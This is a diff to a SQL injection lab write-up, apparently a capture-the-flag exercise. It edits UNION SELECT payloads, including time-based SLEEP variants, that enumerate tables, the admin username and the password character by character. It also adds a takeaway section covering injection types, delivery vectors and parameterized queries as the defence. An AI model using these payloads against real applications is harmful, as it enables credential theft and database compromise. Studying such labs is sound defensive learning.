@@ -154,7 +154,7 @@ Confirmed database name `sqli_three` via {"taken":true} page response
 Queried information_schema.tables within 'sqli_three' database  to enumerate available tables (LIKE)
 
 ```SQL
-admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like '%';--
+UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like '%';--
 ```
 
 Narrowed result down to table 'users' 
@@ -180,7 +180,7 @@ Confirmed column `password` exists
 Repeated enumeration process for username
 
 ```SQL
-admin123' UNION SELECT 1,2,3 from users where username like '%';--
+UNION SELECT 1,2,3 from users where username like '%';--
 ```
 Found `admin` username exists 
 ![usr-enum](Images/sqli-usrconfirm.jpeg)
@@ -188,7 +188,7 @@ Found `admin` username exists
 Repeated process again for password 
 
 ```SQL
-admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '%';--
+ UNION SELECT 1,2,3 from users where username='admin' and password like '%';--
 ```
 
 Found admin password began with 3 
@@ -230,7 +230,7 @@ Introduced to a home page, complete with a timer and Referrer HTTP header inject
 Enumerated column count using the sleep operator 
 
 ```SQL
-admin123' UNION SELECT SLEEP(5),2;--
+ UNION SELECT SLEEP(5),2;--
 ```
 
 ![Column-Count](Images/sqli4-columncount.jpeg)
@@ -253,7 +253,7 @@ Confirmed name of database -- `sqli_four`
 Enumerated the tables character by character using the LIKE operator 
 
 ```SQL
-admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema='sqli_four' AND table_name LIKE '%';--
+ UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema='sqli_four' AND table_name LIKE '%';--
 ```
 
 ![table-enum](Images/sqli4-tableenum.jpeg)
@@ -274,7 +274,7 @@ Iterated through and found the admin password Using the previously enumerated in
 ![password-enum](Images/sqli4-passenum.jpeg)
 
 ```SQL
-admin123' UNION SELECT SLEEP(3),2 FROM users where username='admin' AND password LIKE '%';--
+UNION SELECT SLEEP(3),2 FROM users where username='admin' AND password LIKE '%';--
 ```
 ![password-enum](Images/sqli4-passconfirm.jpeg)
 
@@ -293,5 +293,28 @@ Confirmed
 
 
 #### Key Takeaway
+
+This lab demonstrated how SQL injection vulnerabilities can expose sensitive information and allow for authentication to be bypassed. It emphasized the importance of properly handling user input  so that the injections displayed never come to fruition 
+
+This lab showcased four different levels of SQL injections and techniques used 
+
+1. Union-Based SQLi (In-band)
+2. Authentication Bypass
+3. Boolean-Based Blind SQLi
+4. Time-Based Blind SQLi
+
+A key insight showcased was diversity of delivery vectors for injections on a web application. 
+1. GET param (URL query) -> Union-Based SQLi (In-band)\
+2. POST param (login field) -> Authentication Bypass
+3. GET param (checkuser API) -> Boolean-based Blind SQLi
+4. HTTP header (Referrer) -> Time-Based Blind sqli
+
+The diversity of distance vectors emphasizes that input shouldn't be defended at the entry point but rather the delivery point. Instead of trying to predict delivery vectors and stop them, it is more effective to defend the place where injections will always be delivered. When dealing with client-controlled input it is best to avoid concatenating it and use parameterization so all input is treated as data.
+
+Paramterization allows for intended query logic to be parsed and frozen before any user input touches it. Because the structure is parsed before anything arrives, all user input is injected into the data slots.
+
+
+
+
 
 
